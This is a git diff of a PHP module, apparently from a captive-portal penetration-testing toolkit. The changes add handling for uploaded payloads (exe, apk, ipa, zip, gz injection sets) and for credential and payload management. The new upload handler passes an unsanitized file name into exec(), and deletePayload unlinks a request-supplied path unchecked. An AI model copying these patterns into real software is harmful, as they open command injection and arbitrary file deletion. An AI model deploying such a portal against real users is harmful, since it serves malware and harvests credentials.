@@ -34,6 +34,64 @@ define('__CSAPI__', __PASSDIR__ . "NetCli_CS.zip");
 define('__COMPILEWIN__', __PASSDIR__ . "NetCli_Win.zip");
 define('__COMPILEOSX__', __PASSDIR__ . "NetCli_OSX.zip");
 
+
+/*
+	Determine the type of file that has been uploaded and move it to the appropriate
+	directory.  If it's a .zip it is an injection set and will be unpacked.  If it is
+	an .exe it will be moved to __WINDL__, etc.
+*/
+if (!empty($_FILES)) {
+	$response = [];
+	foreach ($_FILES as $file) {
+		$tempPath = $file[ 'tmp_name' ];
+		$name = $file['name'];
+		$type = pathinfo($file['name'], PATHINFO_EXTENSION);
+		
+		
+		switch ($type) {
+			case 'exe':
+				$dest = __WINDL__;
+				break;
+			case 'zip':
+				$dest = __OSXDL__;
+				break;
+			case 'apk':
+				$dest = __ANDROIDDL__;
+				break;
+			case 'ipa':
+				$dest = __IOSDL__;
+				break;
+			case 'gz':
+				$dest = __INJECTS__;
+				break;
+			default:
+				break;
+		}
+		
+		// Ensure the upload directory exists
+		if (!file_exists($dest)) {
+			if (!mkdir($dest, 0755, true)) {
+				PortalAuth::logError("Failed Upload", "Failed to upload " . $file['name'] . " because the directory structure could not be created");
+			}
+		}
+		
+		$uploadPath = $dest . $name;
+		$res = move_uploaded_file( $tempPath, $uploadPath );
+		
+		if ($res) {
+			if ($type == "gz") {
+				exec(__SCRIPTS__ . "unpackInjectionSet.sh " . $name);
+			}
+			$response[$name] = "Success";
+		} else {
+			$response[$name] = "Failed";
+		}
+	}
+	echo json_encode($response);
+	die();
+}
+
+
 class PortalAuth extends Module
 {
 	public function route() {
@@ -161,6 +219,18 @@ class PortalAuth extends Module
 				break;
 			case 'clearCapturedCreds':
 				$this->clearCapturedCreds();
+				break;
+			case 'getPayloads':
+				$this->getPayloads();
+				break;
+			case 'deletePayload':
+				$this->deletePayload($this->request->filePath);
+				break;
+			case 'cfgUploadLimit':
+				$this->cfgUploadLimit();
+				break;
+			case 'clearDownloads':
+				$this->clearDownloads();
 				break;
 		}
 	}
@@ -506,17 +576,7 @@ class PortalAuth extends Module
 		$this->respond(true, null, $this->downloadFile($file));
 		return true;
 	}
-/*	
-	private function importInjectionSet($file) {
-		$data = array();
-		if ($this->importPayload($file, __INJECTS__)) {
-			exec(__SCRIPTS__ . "unpackInjectionSet.sh " . $file['name'], $data);
-			$this->respond(true);
-			return;
-		}
-		$this->respond(false);
-	}
-*/	
+	
 	private function getInjectionSets() {
 		$dirs = scandir(__INJECTS__);
 		array_shift($dirs); array_shift($dirs);
@@ -566,28 +626,31 @@ class PortalAuth extends Module
 		return true;
 	}
 	
-	//================================//
-	//    PAYLOAD UPLOAD FUNCTIONS    //
-	//================================//
-/*
-	private function importPayload($file, $dir) {	
-		// Check if the directory exists, if not then create it
-		if (!file_exists($dir)) {
-			if (!mkdir($dir, 0755, true)) {
-				$this->logError("payload_upload_error", "The following directory does not exist and could not be created\n" . $dir);
-				$this->respond(false);
-				return false;
+	//=========================//
+	//    PAYLOAD FUNCTIONS    //
+	//=========================//
+	
+	private function getPayloads() {
+		$files = [];
+		
+		foreach ([__WINDL__, __OSXDL__, __ANDROIDDL__, __IOSDL__] as $dir) {
+			foreach (scandir($dir) as $file) {
+				if ($file == "." || $file == "..") {continue;}
+				$files[$file] = $dir;
 			}
 		}
-		$file['name'] = str_replace(array( '(', ')' ), '', $file['name']);
-		$uploadfile = $dir . basename($file['name']);
-		if (move_uploaded_file($file['tmp_name'], $uploadfile)) {
-			$this->respond(true);
-			return true;
+		$this->respond(true, null, $files);
+		return $files;
+	}
+	
+	private function deletePayload($filePath) {
+		if (!unlink($filePath)) {
+			$this->logError("Delete Payload", "Failed to delete payload at path " . $filePath);
+			$this->respond(false);
+			return false;
 		}
-		$this->logError("payload_upload_error", "The destination directory exists but for an unknown reason the file failed to upload.  This is most likely because you are still using the default upload limit in nginx.conf and php.ini.  Go to the Payload tab -> NetClient tab and click on the link 'Configure Upload Limit'.");
-		$this->respond(false);
-		return false;
+		$this->respond(true);
+		return true;
 	}
 	
 	private function cfgUploadLimit() {
@@ -601,7 +664,7 @@ class PortalAuth extends Module
 		$this->respond(true);
 		return true;
 	}
-*/	
+
 	//=========================================//
 	//    ACTIVITY AND TARGET LOG FUNCTIONS    //
 	//=========================================//
@@ -634,11 +697,23 @@ class PortalAuth extends Module
 		}
 	}
 	
+	private function clearDownloads() {
+		$files = scandir(__INCLUDES__ . "downloads/");
+		foreach ($files as $file) {
+			if ($file == "." || $file == "..") {continue;}
+			if (!unlink(__INCLUDES__ . "downloads/" . $file)) {
+				$this->logError("Delete", "Failed to delete file " . __INCLUDES__ . "downloads/" . $file);
+			}
+		}
+		$this->respond(true);
+		return true;
+	}
+	
 	//===========================//
 	//    ERROR LOG FUNCTIONS    //
 	//===========================//
 
-	private function logError($filename, $data) {
+	public static function logError($filename, $data) {
 		$time = exec("date +'%H_%M_%S'");
 		$fh = fopen(__LOGS__ . $filename . "_" . $time . ".txt", "w+");
 		fwrite($fh, $data);
@@ -701,4 +776,3 @@ class PortalAuth extends Module
 		}
 	}
 }
-
